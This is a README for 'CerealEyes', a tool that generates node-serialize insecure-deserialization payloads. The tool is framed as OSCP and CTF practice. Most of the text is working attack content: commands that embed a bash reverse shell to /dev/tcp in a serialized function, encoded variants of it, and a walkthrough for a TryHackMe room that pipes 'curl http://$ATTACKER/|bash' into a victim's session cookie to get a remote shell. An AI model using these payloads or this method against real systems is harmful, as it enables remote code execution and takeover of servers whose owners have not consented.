# CerealEyes

Set of applications to help with the exploitation of Insecure Deserialization 
vulnerabilities.

I will try to add more functionalities and/or support for more programming languages
as I see them.

## Why this repository?

1. I have seen many people exploiting this vulnerability in some languages, and they
keep modifying the file to make a different serialized object. Nevertheless, I like
specifying the payload as an argument. I think it is quicker.

2. If I ever have the opportunity to take the OSCP (by Offensive Security), I would like
to spend little time in doing this task and yet exploiting this manually.

3. Why not?

### Node.js

To serialize objects with the payloads we want, we should install the packages:
- `node-serialize`
- `argparse`
with `npm install <package>`

See the help:
```bash
serialize.js -h
```

Serialize an JSON object with the specified payload:
```bash
serialize.js 'bash -i >& /dev/tcp/127.0.0.1/443 0>&1'
```
Will return:
```text
{"rce":"_$$ND_FUNC$$_function(){require(\"child_process\").exec(\"bash -i >& /dev/tcp/127.0.0.1/443 0>&1\",function(error,stdout,stderr){console.log(stdout)})}()"}
```

Serialize an JSON object with the specified payload and encode it in Base64:
```bash
serialize.js 'bash -i >& /dev/tcp/127.0.0.1/443 0>&1' -b
```
Will return:
```text
eyJyY2UiOiJfJCRORF9GVU5DJCRfZnVuY3Rpb24oKXtyZXF1aXJlKFwiY2hpbGRfcHJvY2Vzc1wiKS5leGVjKFwiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQzIDA+JjFcIixmdW5jdGlvbihlcnJvcixzdGRvdXQsc3RkZXJyKXtjb25zb2xlLmxvZyhzdGRvdXQpfSl9KCkifQ==
```

Serialize an JSON object with the specified payload, encode it in Base64 and encode it
in URL format:
```bash
serialize.js 'bash -i >& /dev/tcp/127.0.0.1/443 0>&1' -b -u
```
Will return:
```text
eyJyY2UiOiJfJCRORF9GVU5DJCRfZnVuY3Rpb24oKXtyZXF1aXJlKFwiY2hpbGRfcHJvY2Vzc1wiKS5leGVjKFwiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQzIDA+JjFcIixmdW5jdGlvbihlcnJvcixzdGRvdXQsc3RkZXJyKXtjb25zb2xlLmxvZyhzdGRvdXQpfSl9KCkifQ%3D%3D
```
**Note**: When both `-b` and `-u` are used, it always encode in Base64 and then in URL 
format regardless of the order they were specified.

#### Practical example

We can put it into practise with [Jason](https://tryhackme.com/room/jason), a free THM room:
```bash
atk$ echo "bash -i >& /dev/tcp/$IP/443 0>&1" > index.html
atk$ sudo python3 -m http.server 80
```
Within another console:
```bash
atk$ PAYLOAD=$(./serialize.js "curl http://$ATTACKER/|bash" -b)
atk$ curl -sS http://$VICTIM/ -G -b "session=$PAYLOAD"
```
If we had a listener on port 443, within a third console, we should get a reverse shell.



